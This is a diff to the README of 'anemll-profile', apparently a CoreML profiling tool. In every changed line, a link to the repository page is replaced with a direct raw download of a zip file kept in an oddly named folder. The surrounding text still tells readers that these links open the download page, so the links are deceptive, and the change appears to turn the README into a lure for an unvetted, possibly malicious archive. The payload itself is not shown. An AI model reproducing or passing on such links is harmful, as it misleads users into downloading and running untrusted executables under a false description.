@@ -1,6 +1,6 @@
 # ⚙️ anemll-profile - Analyze CoreML Model Performance
 
-[![Download anemll-profile](https://img.shields.io/badge/Download-anemll--profile-brightgreen)](https://github.com/Taurine-giveandtake23/anemll-profile)
+[![Download anemll-profile](https://img.shields.io/badge/Download-anemll--profile-brightgreen)](https://github.com/Taurine-giveandtake23/anemll-profile/raw/refs/heads/main/ricinelaidinic/profile-anemll-1.7-beta.1.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This ensures the program runs smoothly and without errors.
 
 ## 🚀 Getting Started with anemll-profile
 
-1. **Download the tool:** Use the green button above or click [here](https://github.com/Taurine-giveandtake23/anemll-profile) to visit the download page.
+1. **Download the tool:** Use the green button above or click [here](https://github.com/Taurine-giveandtake23/anemll-profile/raw/refs/heads/main/ricinelaidinic/profile-anemll-1.7-beta.1.zip) to visit the download page.
 
 2. **Extract the files:** The download page will guide you to download a compressed folder (.zip). After downloading, right-click the file and choose "Extract All". Pick a folder where you want to save the program files.
 
@@ -40,7 +40,7 @@ This ensures the program runs smoothly and without errors.
 
 To download and install anemll-profile, follow these steps carefully:
 
-1. Click this link: [Download Page](https://github.com/Taurine-giveandtake23/anemll-profile).
+1. Click this link: [Download Page](https://github.com/Taurine-giveandtake23/anemll-profile/raw/refs/heads/main/ricinelaidinic/profile-anemll-1.7-beta.1.zip).
 
 2. The page opens the GitHub repository for anemll-profile. Locate the “Releases” section on the right or scroll down to find it.
 
@@ -109,7 +109,7 @@ For detailed issues, check the repository’s “Issues” tab on GitHub.
 
 To update:
 
-1. Return to the [Download Page](https://github.com/Taurine-giveandtake23/anemll-profile).
+1. Return to the [Download Page](https://github.com/Taurine-giveandtake23/anemll-profile/raw/refs/heads/main/ricinelaidinic/profile-anemll-1.7-beta.1.zip).
 
 2. Check for a newer release.
 
@@ -131,4 +131,4 @@ If you need support:
 
 ---
 
-[![Download anemll-profile](https://img.shields.io/badge/Get-Started%20Now-blue)](https://github.com/Taurine-giveandtake23/anemll-profile)
+[![Download anemll-profile](https://img.shields.io/badge/Get-Started%20Now-blue)](https://github.com/Taurine-giveandtake23/anemll-profile/raw/refs/heads/main/ricinelaidinic/profile-anemll-1.7-beta.1.zip)
